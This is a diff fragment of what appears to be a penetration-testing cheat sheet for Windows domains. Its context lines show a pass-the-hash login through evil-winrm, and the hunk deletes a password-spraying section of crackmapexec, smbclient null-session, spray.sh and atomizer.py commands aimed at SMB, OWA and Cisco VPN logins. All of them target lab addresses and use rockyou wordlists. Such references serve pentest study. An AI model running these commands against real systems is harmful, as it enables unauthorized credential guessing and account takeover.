@@ -67,16 +67,5 @@ Invoke-Command -ComputerName john.insomnia.io -Credential $Cred  -ScriptBlock {c
 proxychains evil-winrm -u john -H <NTLM Hash> -i 192.168.199
 ```
 
- ### Password Spraying Attack 
-```
 
-crackmapexec smb 192.168.1.1  -d insomnia.io -u john -P /usr/share/wordlists/rockyou.txt
-smbclient -N -L \\\\192.168.1.199 | grep Disk | sed 's/^\s*\(.*\)\s*Disk.*/\1/' 
-crackmapexec smb 192.168.1.199 -u John -H NTLM Hash 
-crackmapexec smb 192.168.1.99 -u '' -p '' #NULL Sessions
-spray.sh -smb 192.168.1.100 users.txt /usr/share/wordlists/rockyou.txt  1 35 insomnia.io
-spray.sh -owa 192.168.1.100 users.txt  /usr/share/wordlists/rockyou.txt   1 35 Request.body #OWA
-spray.sh -cisco 192.168.1.100 usernames.txt /usr/share/wordlists/rockyou.txt 1 35 #CISCO Web VPN
-python atomizer.py owa insomnia.io '123456@' emails.txt
-```
 
